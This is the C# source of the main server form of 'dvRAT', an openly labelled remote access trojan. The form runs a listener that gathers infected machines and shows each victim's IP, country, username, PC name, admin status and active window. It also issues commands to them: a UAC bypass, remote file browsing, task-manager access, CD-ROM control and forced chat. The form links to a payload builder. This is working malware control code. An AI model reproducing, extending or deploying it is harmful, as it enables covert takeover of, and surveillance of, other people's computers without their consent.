// *
// * dvRAT
// * @copyright      Copyright (c) DEvil. (https://www.instagram.com/justalghamdi AKA https://www.github.com/justalghamdi)
// * @author         justalghamdi
// *
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.Net;
using Newtonsoft.Json.Linq;

namespace dvrat
{
    public partial class Form1 : Form
    {
       
        public Form1()
        {
            InitializeComponent();
        }

        #region pub vars
        //Pub vars in the namespace
        chat_form cht_frm;
        file_explorer_form fle_explr_frm;
        private IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 8080);
        private List<Socket> clients_sockets = new List<Socket>();
        private Socket client_socket;
        private static Socket listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        private int selected_client_index = 0;
        private List<int> clients_online = new List<int>();
        #endregion

        #region form functions
        //its functions that mmake changes or help you to control form .


        private void Form1_Deactivate(object sender, EventArgs e)
        {
            this.Opacity = 0.7;
            is_focus_label1.Text = "IS_FOCUS [ false ]";
        }

        private void Form1_Activated(object sender, EventArgs e)
        {
            this.Opacity = 1;
            is_focus_label1.Text = "IS_FOCUS [ true ]";
        }

        private void exit_x_label_MouseHover(object sender, EventArgs e)
        {
            exit_x_label.ForeColor = Color.Black;
        }

        private void exit_x_label_MouseLeave(object sender, EventArgs e)
        {
            exit_x_label.ForeColor = Color.White;
        }

        private void minimized_label_MouseHover(object sender, EventArgs e)
        {
            minimized_label.ForeColor = Color.Black;
        }

        private void minimized_label_MouseLeave(object sender, EventArgs e)
        {
            minimized_label.ForeColor = Color.White;
        }

        private void exit_x_label_Click(object sender, EventArgs e)
        {
            Process.GetCurrentProcess().Kill();
        }


        private void minimized_label_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void about_linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            new AboutBox1().ShowDialog();
        }

        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        private void header_1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void current_time()
        {
            for (; ; )
            {
                current_time_label.Invoke(new MethodInvoker(() =>
                {
                    current_time_label.Text = string.Format("[ {0:HH:mm:ss tt} ]", DateTime.Now);
                }));
                Thread.Sleep(1000);
            }
        }

        private void update_memory_usage()
        {
            Process currentProcess = System.Diagnostics.Process.GetCurrentProcess();
            long totalBytesOfMemoryUsed = 0;
            for (; ; )
            {
                totalBytesOfMemoryUsed = currentProcess.WorkingSet64;
                mem_usage_label.Invoke(new MethodInvoker(() =>
                {
                    mem_usage_label.Text = $"Mem_Usage [ {DataSize(totalBytesOfMemoryUsed)} ]";
                }));
                Thread.Sleep(1000);
            }
        }


        private void update_cpu_usage()
        {
            float cpu_usage = 0;
            PerformanceCounter cpu = new PerformanceCounter("Process", "% Processor Time", Process.GetCurrentProcess().ProcessName);

            for (; ; )
            {
                cpu_usage = Convert.ToSingle(System.Convert.ToInt32(Math.Round(System.Convert.ToDouble((cpu.NextValue() / (double)System.Convert.ToSingle(Environment.ProcessorCount))))));
                cpu_usage_label.Invoke(new MethodInvoker(() =>
                {
                    cpu_usage_label.Text = $"CPU [ {string.Format("{0:0.00}%", cpu_usage)} ]";
                }));
                Thread.Sleep(1000);
            }
        }
   
        private void Form1_Load(object sender, EventArgs e)
        {
            contextMenuStrip1.Enabled = false;
            log_box.HorizontalScrollbar = true;
            threads_label.Location = new Point(529 ,427);
            socket_label.Location = new Point(597, 427);
            threads_label.Text = $"Threads [{Process.GetCurrentProcess().Threads.Count}]";
            this.Width = 1004;
            this.Height = 450;
            new Thread(new ThreadStart(new Action(() => { startServer(); }))).Start();
            new Thread(new ThreadStart(new Action(() => { current_time(); }))).Start();
            new Thread(new ThreadStart(new Action(() => { update_memory_usage(); }))).Start();
            new Thread(new ThreadStart(new Action(() => { update_cpu_usage(); }))).Start();
        }

        private void log_link_label_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            if (log_link_label.Text.Contains("Logs"))
            {
                this.Width = 1368;
                log_link_label.Text = "[ Hide ]";
            }
            else
            {
                this.Width = 1004;
                log_link_label.Text = "[ Logs ]";
            }
        }

        private void builder_link_label_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            new builder_form().ShowDialog(); ;
        }

        private void messageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Socket client = get_client_by_index(this.selected_client_index);
            if (client != null)
            {
                if (!delete_if_not_connect(client))
                {
                    config_message_box cnf_msg_bx = new config_message_box(client, this);
                    cnf_msg_bx.ShowDialog();
                }
            }
        }


        private void oPENCDROMToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Socket client = get_client_by_index(this.selected_client_index);
            if (client != null)
            {
                if (!delete_if_not_connect(client))
                {
                    send_to_client(client, "open_cd_rom;");
                }
            }
        }

        private void tASKMANEGARToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Socket client = get_client_by_index(this.selected_client_index);
            if (client != null)
            {
                if (!delete_if_not_connect(client))
                {
                    send_to_client(client, "get_tsk_mgr;");
                }
            }
        }

        private void cHATToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Socket client = get_client_by_index(this.selected_client_index);
            if (client != null)
            {
                if (!delete_if_not_connect(client))
                {
                    send_to_client(client, "start_chat;");
                    cht_frm = new chat_form(client, this);
                    cht_frm.ShowDialog();
                }
            }
        }

        private void fILEEXPLORERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Socket client = get_client_by_index(this.selected_client_index);
            if (client != null)
            {
                if (!delete_if_not_connect(client))
                {
                    send_to_client(client, "get_main_dirs;");
                }
            }
        }
        private void uACBYPASSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Socket client = get_client_by_index(this.selected_client_index);
            if (client != null)
            {
                if (!delete_if_not_connect(client))
                {
                    send_to_client(client, "uacbypass;");
                }
            }
        }

        private void zeroUpDw_Labels()
        {
            while (true)
            {
                if (!download_label.Text.Contains("0 Bytes"))
                {
                    Thread.Sleep(1000);
                    download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(0)} ]"; }));
                }
                if (!upload_label.Text.Contains("0 Bytes"))
                {
                    Thread.Sleep(1000);
                    upload_label.Invoke(new MethodInvoker(() => { upload_label.Text = $"Upload [ {DataSize(0)} ]"; }));
                }
                Thread.Sleep(1000);
            }
        }

        private bool delete_if_not_connect(Socket client)
        {
            if (!SocketConnected(client))
            {
                dataGridView1.Rows.RemoveAt(get_client_index(client));
                return true;
            }
            else
            {
                return false;
            }
        }

        private void refresh()
        {
            while (true)
            {
                threads_label.Invoke(new MethodInvoker(() =>
                {
                    threads_label.Text = $"Threads [{Process.GetCurrentProcess().Threads.Count}]";
                }));
                try
                {
                    connections_label.Invoke(new MethodInvoker(() => { connections_label.Text = $"Connections [ {clients_sockets.Count} ]"; }));
                  
                    if (clients_sockets.Count == 0)
                    {
                        if (dataGridView1.Rows.Count != 0)
                        {
                            for (int i = 0; i < dataGridView1.Rows.Count; i++)
                            {
                                dataGridView1.Invoke(new MethodInvoker(() => { dataGridView1.Rows.RemoveAt(i); }));
                            }
                        }
                    }
                  
                    if (dataGridView1.Rows.Count != 0)
                    {
                        if (contextMenuStrip1.InvokeRequired)
                        {
                            contextMenuStrip1.Invoke(new MethodInvoker(() =>
                            {
                                contextMenuStrip1.Enabled = true;
                            }));
                        }
                        else
                        {
                            contextMenuStrip1.Enabled = true;
                        }
                    }
                    else
                    {
                        if (contextMenuStrip1.InvokeRequired)
                        {
                            contextMenuStrip1.Invoke(new MethodInvoker(() =>
                            {
                                contextMenuStrip1.Enabled = false;
                            }));
                        }
                        else
                        {
                            contextMenuStrip1.Enabled = false;
                        }
                    }
                    Thread.Sleep(1000);
                }
                catch (Exception)
                {
                    //pass
                }

                for (int i = 0; i < dataGridView1.Rows.Count; ++i)
                {
                    if ( (get_client_by_index(i)) == null)
                    {
                        //Client Does not exists and the row is deleted
                        continue;
                    }

                    string st = dataGridView1.Rows[i].Cells["_client_status"].Value.ToString();
                    if (st.Equals("offline"))
                    {
                        Socket client = get_client_by_index(i);
                        if (client == null)
                        {
                            continue;
                        }
                        if (!SocketConnected(client))
                        {
                            clients_sockets.RemoveAt(i);
                            dataGridView1.Rows.RemoveAt(i);
                        }
                        else
                        {
                            dataGridView1.Invoke(new MethodInvoker(() => {
                                dataGridView1.Rows[i].Cells["_client_status"].Value = "online";
                            }));
                        }
                    }
                }
            }
        }

        private void scroll_down_log()
        {
            try
            {
                while (true)
                {
                    int visibleItems = log_box.ClientSize.Height / log_box.ItemHeight;
                    log_box.TopIndex = Math.Max(log_box.Items.Count - visibleItems + 1, 0);
                    Thread.Sleep(500);
                }
            }
            catch (Exception )
            {
                //pass
            }
        }

        private void dataGridView1_CellMouseMove(object sender, DataGridViewCellMouseEventArgs e)
        {
            if (e.RowIndex >= 0 && e.ColumnIndex >= 0)
            {
                this.selected_client_index = e.RowIndex;
                selected_client_label.Text = $"SELECTED_CLIENT [ {this.selected_client_index} ]";
            }
        }


        #endregion

        #region helper functions
        //it is Fucntions help you in someting like get info of an ip or get The size of data in string etc...
        private string getIpInfo(string ip)
        {
            WebClient wb = new WebClient();
            string ip_info = wb.DownloadString($"http://ip-api.com/json/{ip}");
            return ip_info;
        }

        public string DataSize(long len)
        {
            if ((len.ToString().Length < 4))
                return (len.ToString() + " Bytes");
            string strsize = null;
            double _size = (Convert.ToDouble(len) / 1024);
            if ((_size < 1024))
                strsize = "KB";
            else
            {
                _size = (_size / 1024);
                if ((_size < 1024))
                    strsize = "MB";
                else
                {
                    _size = (_size / 1024);
                    strsize = "GB";
                }
            }
            return (_size.ToString(".0") + " " + strsize);
        }

        private string[] xSplit(string toSplit, string splitOn)
        {
            return toSplit.Split(new string[] { splitOn }, StringSplitOptions.None);
        }
        #endregion

        #region server functions 
        //it is Functions that make changes/check/etc... with sockets and you use sockets in them .

        public bool send_to_client(Socket client, string message)
        {
            try
            {
                int send_bytes = client.Send(Encoding.Default.GetBytes(message));
                upload_label.Invoke(new MethodInvoker(() => { upload_label.Text = $"Upload [ {DataSize(send_bytes)} ]"; upload_label.Refresh(); }));
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }


        private int get_client_index(Socket client_socket)
        {
            return clients_sockets.IndexOf(client_socket);
        }

        public Socket get_client_by_index(int i)
        {
            try
            {
                return this.clients_sockets[i];
            }
            catch (Exception)
            {
                dataGridView1.Rows.RemoveAt(i);//Client not on index
                return null;
            }
        }



        bool SocketConnected(Socket s)
        {
            try
            {

                if (s == null)
                    return false;
                bool part1 = s.Poll(1000, SelectMode.SelectRead);
                bool part2 = (s.Available == 0);
                if (part1 && part2)
                    return false;
                else
                {
                    try
                    {
                        int sentBytesCount = s.Send(new byte[1], 1, 0);
                        upload_label.Invoke(new MethodInvoker(() => { upload_label.Text = $"Upload [ {DataSize(sentBytesCount)} ]"; upload_label.Refresh(); }));

                        return sentBytesCount == 1;
                    }
                    catch
                    {
                        return false;
                    }
                }
            }
            catch (Exception)
            {
                return false;
            }
        }

      
        private void refresh_clients()
        {
            while (true)
            {
                try
                {
                    for (int i = 0; i <= clients_sockets.Count; i++)
                    {
                        Socket client = clients_sockets[i];
                        if (SocketConnected(client))
                        {
                            if (Application.OpenForms["chat_form"] == null)
                            {
                                int send_bytes = client.Send(Encoding.Default.GetBytes("refresh;"));
                                upload_label.Invoke(new MethodInvoker(() => { upload_label.Text = $"Upload [ {DataSize(send_bytes)} ]"; upload_label.Refresh(); }));
                            }
                            else
                            {
                                log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: We don\'t send refresh because you open chat!"); }));

                            }

                        }
                    }
                }
                catch (Exception )
                {
                    //pass
                }
                Thread.Sleep(1000);
            }
        }





        private void dealing_with_the_client(Socket client_socket)
        {
            _start:
            try {
                client_socket.ReceiveTimeout = 5 * 1000;
                bool is_admin = false;
                int current_index = get_client_index(client_socket);
                string client_username_main_dir = "#client_main_disk\\Users\\#client_username";
                string client_MAIN_DISK = null;
                string client_ALL_DISK = null;
                string client_windows_username = null;
                string client_pc_name = null;
                string client_win_main_dir = null;
                string ip = null;
                Bitmap country_image = null;
                int index_of_client_socket = 0;
                int index_row_of_grid = 0;
                int empty_recv = 0, no_ok = 0 ;
                int send_bytes = client_socket.Send(Encoding.Default.GetBytes("getinfo;"));
                upload_label.Invoke(new MethodInvoker(() => { upload_label.Text = $"Upload [ {DataSize(send_bytes)} ]"; }));
                int bytes_recv = 0;
                int num_of_bytes_to_recv = 0xfff;
                byte[] buffer_recv = new byte[num_of_bytes_to_recv];
                while (client_socket.Connected)
                { 
            
                   
                _start_recv:
                        this.Invoke(new MethodInvoker(() =>
                        {
                            Refresh();
                        }));
                            index_of_client_socket = get_client_index(client_socket);
                            if (index_of_client_socket == -1)
                            {
                                if (index_row_of_grid != -1)
                                {
                                    if (!SocketConnected(client_socket))
                                    {
                                        dataGridView1.Rows[index_row_of_grid].Cells["_client_status"].Value = "offline";
                                        clients_online.RemoveAt(index_of_client_socket);
                                    }
                                }
                                if (!SocketConnected(client_socket))
                                {
                                    break;
                                }
                            }
                           
                            if (index_row_of_grid != index_of_client_socket)
                            {
                                if (SocketConnected(client_socket))
                                {
                                    index_row_of_grid = index_of_client_socket;
                                }
                                else
                                {
                                    clients_online.RemoveAt(index_of_client_socket);
                                    break;
                                }
                            }
                            
                            try
                            {
                                if (no_ok >= 50)
                                {
                                    if (!SocketConnected(client_socket))
                                    {
                                        break;
                                    }
                                }
                                if (empty_recv >= 10)
                                {
                                    //some err happend
                                    if (!SocketConnected(client_socket))
                                    {
                                        dataGridView1.Rows[index_row_of_grid].Cells["_client_status"].Value = "offline";
                                        clients_online.RemoveAt(index_of_client_socket);
                                        break;
                                    }
                                    else
                                    {
                                        continue;
                                    }
                                }

                                bytes_recv = client_socket.Receive(buffer_recv);

                            }
                            catch (Exception ex)
                            {
                                empty_recv += 1;
                                no_ok += 1;
                                goto _start_recv;
                            }
                            string string_recv = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
                            if (string_recv.Length == 0)
                            {
                                empty_recv += 1;
                                goto _start_recv;
                            }
                            log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: recv from client: {string_recv}"); }));
                            download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(string_recv.Length)} ]"; download_label.Refresh(); }));
                            if (string_recv.StartsWith("start_up_info;"))
                            {
                            
                                connections_label.Invoke(new MethodInvoker(() => { connections_label.Text = $"Connections [ {clients_sockets.Count} ]"; }));
                                string remove_tag = string_recv.Substring(14);
                                string[] info_array = remove_tag.Split('\n');
                                ip = info_array[0];
                                string active_window = info_array[1];
                                client_windows_username = info_array[2];
                                client_pc_name = info_array[3];
                                client_win_main_dir = info_array[4];
                                client_MAIN_DISK = client_win_main_dir.Split('\\')[0];
                                string[] disks_arr = xSplit(info_array[5], "&=");
                                is_admin = string_recv.Contains("true_admin") ? true : false;
                               

                                if (!ip.Contains("ERR_WHILE_GET_IP"))
                                {
                                    string ip_info = getIpInfo(ip);
                                    var obj = JObject.Parse(ip_info);
                                    string country_code = $"{obj["countryCode"]}";
                                    country_image = new Bitmap($"res\\Flags\\{country_code.ToLower()}.png");
                                    dataGridView1.Invoke(new MethodInvoker(() =>
                                    {
                                        index_row_of_grid = dataGridView1.Rows.Add(
                                        country_image,
                                        ip,
                                        active_window,
                                        client_windows_username,
                                        client_pc_name,
                                        string_recv.Contains("true_admin") ? "true" : "false",
                                        "online");
                                    }));
                                }
                                else
                                {

                                    country_image = new Bitmap($"res\\Flags\\-1.png");
                                    dataGridView1.Invoke(new MethodInvoker(() =>
                                    {
                                        index_row_of_grid = dataGridView1.Rows.Add(
                                        country_image,
                                        "ERR_WHILE_GET_IP",
                                        active_window,
                                        client_windows_username,
                                        client_pc_name,
                                        string_recv.Contains("true_admin") ? "true" : "false",
                                        "online");
                                    }));
                                    log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: err in get client ip"); }));
                                }

                            }
                            else if (string_recv.StartsWith("ok_refresh;"))
                            {
                                dataGridView1.Rows[index_row_of_grid].Cells["_client_status"].Value = "online";
                                no_ok = 0;
                                empty_recv = 0;
                                string[] tags = string_recv.Split('\n');
                                string window_name = tags[1].Substring(10);
                                try
                                {
                                    dataGridView1.Invoke(new MethodInvoker(() =>
                                    {
                                        dataGridView1.Rows[index_row_of_grid].Cells["_active_window"].Value = window_name;
                                    }));
                                    log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: client number {index_of_client_socket} send OK"); }));
                                }
                                catch (Exception ex)
                                {
                                    // the error must be that the client don't send its info so its not on the Grid !
                                    if (!SocketConnected(client_socket))
                                    {
                                        client_socket.Close();
                                        clients_sockets.RemoveAt(index_of_client_socket);//remove client
                                        clients_online.RemoveAt(index_of_client_socket);
                                        connections_label.Invoke(new MethodInvoker(() => { connections_label.Text = $"Connections [ {clients_sockets.Count} ]"; }));
                                        dataGridView1.Rows[index_row_of_grid].Cells["_client_status"].Value = "offline";

                                        break;
                                        //TODO: tell client to reconnect
                                    }
                                }
                             
                            }
                            else if (string_recv.StartsWith("tsk_mgr;"))
                            {
                            
                                int mgr_size = string_recv.Length;
                                string sub_it = string_recv.Substring(8);
                                string[] tags = sub_it.Split('\n');
                                string chunk = tags[1];
                                int size = Int32.Parse(tags[0]);
                            _begin:

                                if (mgr_size >= size)
                                {
                                    try
                                    {
                                        JObject tsk_obj = JObject.Parse(chunk);
                                        tsk_mgr_view tsk_mgr_form = new tsk_mgr_view(client_socket, this, tsk_obj);
                                        tsk_mgr_form.victm_name = dataGridView1.Rows[this.selected_client_index].Cells["_PC_NAME"].Value.ToString();
                                        tsk_mgr_form.ShowDialog();
                                    }
                                    catch (Exception) //something wrong with chunk
                                    {
                                        bytes_recv = client_socket.Receive(buffer_recv);
                                        string_recv = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
                                        chunk += string_recv; // it should be the complete of chunk with out tags
                                        mgr_size += string_recv.Length;
                                        download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(string_recv.Length)} ]"; download_label.Refresh(); }));
                                        goto _begin;
                                    }
                                }
                                else
                                {
                                    bytes_recv = client_socket.Receive(buffer_recv);
                                    string_recv = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
                                    chunk += string_recv; // it should be the complete of chunk with out tags
                                    mgr_size += string_recv.Length;
                                    download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(string_recv.Length)} ]"; download_label.Refresh(); }));
                                    goto _begin;
                                }
                            }
                            else if (string_recv.StartsWith("client_new_message;"))
                            {
                                string message = string_recv.Substring("client_new_message;".Length);
                                if (message.Contains("force_close"))
                                {
                                    send_to_client(client_socket, "start_chat;");//force reopen
                                }else
                                {
                                    cht_frm.add_to_list(message);
                                }
                            }
                            else if (string_recv.StartsWith("client_recv_main_dir;"))
                            {
                            
                                int fl_exp_size = string_recv.Length;
                                string sub_it = string_recv.Substring("client_recv_main_dir;".Length);
                                if (sub_it.Contains("err"))
                                {
                                    fle_explr_frm._err("can't open file\\folder!");
                                }
                                else
                                {
                                    string[] tags = sub_it.Split('\n');
                                    string chunk = tags[1];
                                    int size = Int32.Parse(tags[0]);
                                _begin:
                                    if (fl_exp_size == size)
                                    {
                                        try
                                        {
                                            JObject files_obj = JObject.Parse(chunk);
                                            fle_explr_frm.load_main_files(files_obj);

                                        }
                                        catch (Exception ex)
                                        {
                                            fle_explr_frm._err("can't open file\\folder!");
                                        }
                                    }
                                    else
                                    {
                                        if (fl_exp_size > size)
                                        {
                                            int __ = fl_exp_size - size;
                                            size += __;
                                            goto _begin;
                                        }
                                        else
                                        {
                                            bytes_recv = client_socket.Receive(buffer_recv);
                                            string_recv = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
                                            chunk += string_recv; // it should be the complete of chunk with out tags
                                            fl_exp_size += string_recv.Length;
                                            download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(string_recv.Length)} ]"; download_label.Refresh(); }));
                                            goto _begin;
                                        }
                                    }
                                }
                            }
                            else if (string_recv.StartsWith("client_recv_sub_main_files;"))
                            {
                                int fl_exp_size = string_recv.Length;
                                string sub_it = string_recv.Substring("client_recv_sub_main_files;".Length);
                                if (sub_it.Contains("err"))
                                {
                                    fle_explr_frm._err("can't open file\\folder!");
                                }
                                else
                                {
                                    string[] tags = sub_it.Split('\n');
                                    string chunk = tags[1];
                                    int size = Int32.Parse(tags[0]);
                                _begin:
                                    if (fl_exp_size == size)
                                    {
                                        try
                                        {
                                            JObject files_obj = JObject.Parse(chunk);
                                            fle_explr_frm.load_files(files_obj);

                                        }
                                        catch (Exception ex)
                                        {
                                            fle_explr_frm._err("can't open file\\folder!");
                                        }
                                    }
                                    else
                                    {
                                        if (fl_exp_size > size)
                                        {
                                            int __ = fl_exp_size - size;
                                            size += __;
                                            goto _begin;
                                        }
                                        else
                                        {
                                            bytes_recv = client_socket.Receive(buffer_recv);
                                            string_recv = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
                                            chunk += string_recv; // it should be the complete of chunk with out tags
                                            fl_exp_size += string_recv.Length;
                                            download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(string_recv.Length)} ]"; download_label.Refresh(); }));
                                            goto _begin;
                                        }
                                    }
                                }
                            }
                            else if (string_recv.StartsWith("client_recv_sub_files;"))
                            {
                                int fl_exp_size = string_recv.Length;
                                string sub_it = string_recv.Substring("client_recv_sub_files;".Length);
                                if (sub_it.Contains("err"))
                                {
                                    fle_explr_frm._err("can't open file\\folder!");
                                }
                                else
                                {
                                    string[] tags = sub_it.Split('\n');
                                    string chunk = tags[1];
                                    int size = Int32.Parse(tags[0]);
                                _begin:
                                    if (fl_exp_size == size)
                                    {
                                        try
                                        {
                                            JObject files_obj = JObject.Parse(chunk);
                                            fle_explr_frm.load_files(files_obj);

                                        }
                                        catch (Exception ex)
                                        {
                                            fle_explr_frm._err("can't open file\\folder!");
                                        }
                                    }
                                    else
                                    {
                                        if (fl_exp_size > size)
                                        {
                                            int __ = fl_exp_size - size;
                                            size += __;
                                            goto _begin;
                                        }
                                        else
                                        {
                                            bytes_recv = client_socket.Receive(buffer_recv);
                                            string_recv = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
                                            chunk += string_recv; // it should be the complete of chunk with out tags
                                            fl_exp_size += string_recv.Length;
                                            download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(string_recv.Length)} ]"; download_label.Refresh(); }));
                                            goto _begin;
                                        }
                                    }
                                }
                            }
                        else if (string_recv.StartsWith("main_dirs;")) 
                        {
                            string remove_tag = string_recv.Substring(11);
                            string[] info_array = remove_tag.Split('\n');
                            client_windows_username = info_array[0];
                            client_pc_name = info_array[1];
                            client_win_main_dir = info_array[2];
                            client_MAIN_DISK = client_win_main_dir.Split('\\')[0];
                            string[] disks_arr = xSplit(info_array[3], "&=");
                            for (int i = 1; i < disks_arr.Length; i++)
                            {
                                if (!disks_arr[i].Contains("END"))
                                {
                                    client_ALL_DISK += disks_arr[i].Trim() + '\n';
                                }
                            }
                   
                            client_username_main_dir = client_username_main_dir.Replace("#client_main_disk", client_MAIN_DISK);
                            client_username_main_dir = client_username_main_dir.Replace("#client_username", client_windows_username);
                            fle_explr_frm = new file_explorer_form(client_socket, this, client_username_main_dir);
                            fle_explr_frm.victm_name = dataGridView1.Rows[this.selected_client_index].Cells["_PC_NAME"].Value.ToString();
                            send_to_client(client_socket, $"start_fileexplorer;\n{client_username_main_dir}");
                            new Thread(new ThreadStart(new Action(() => {
                                fle_explr_frm._MAIN_DISKS = client_ALL_DISK.Split('\n');
                                fle_explr_frm.ShowDialog();
                            }))).Start();
                        }
                        if (Application.OpenForms["chat_form"] == null) { 
                                no_ok += 1;
                        }
                        GC.Collect();//Collect to not fill memory

                }
                try
                {
                    client_socket.Close();
                    clients_sockets.RemoveAt(index_of_client_socket);//remove client
                    clients_online.RemoveAt(index_of_client_socket);
                    dataGridView1.Invoke(new MethodInvoker(() => { dataGridView1.Rows.RemoveAt(index_row_of_grid); dataGridView1.Refresh(); }));
                    connections_label.Invoke(new MethodInvoker(() => { connections_label.Text = $"Connections [ {clients_sockets.Count} ]"; }));
                    dataGridView1.Rows[index_row_of_grid].Cells["_client_status"].Value = "offline";
                }
                catch (Exception)
                {
                    /* just pass */
                }
            }
            catch (Exception )
            {
                
            }
            GC.Collect();//Collect to not fill memory
            if (SocketConnected(client_socket)) //Last Check!
            {
                goto _start;
            }

        }
        private void startServer()
        {

            new Thread(new ThreadStart(new Action(() => { refresh_clients(); }))).Start();
            new Thread(new ThreadStart(new Action(() => { scroll_down_log(); }))).Start();
            new Thread(new ThreadStart(new Action(() => { refresh(); }))).Start();
            new Thread(new ThreadStart(new Action(() => { zeroUpDw_Labels(); }))).Start();
            listener.Bind(endPoint);
            listener.Listen(0x10);/* 16 backlog */
            log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add("log: create listener socket was good"); }));
            log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: listener AF = {listener.AddressFamily};"); }));
            log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: listener Protocol = {listener.ProtocolType};"); }));
            log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add("log: listener socket Bind(); was good"); }));
            log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add("log: listener socket Listen(); was good"); }));
            socket_label.Invoke(new MethodInvoker(() =>
            {
                socket_label.Text = "SOCKET_FD [OK]";
            }));
            while (true)
            {
                log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add("log: listener/server start Accept"); }));
            _start:

                client_socket = listener.Accept();
                if (clients_sockets.Count > 12)
                {
                    client_socket.Close();
                    goto _start;
                }
                clients_sockets.Add(client_socket);
                clients_online.Add(get_client_index(client_socket));
                new Thread(new ThreadStart(new Action(() => { dealing_with_the_client(client_socket); }))).Start();
                
                goto _start;
            }
        }






        /* END server functions */
        #endregion


    }
}
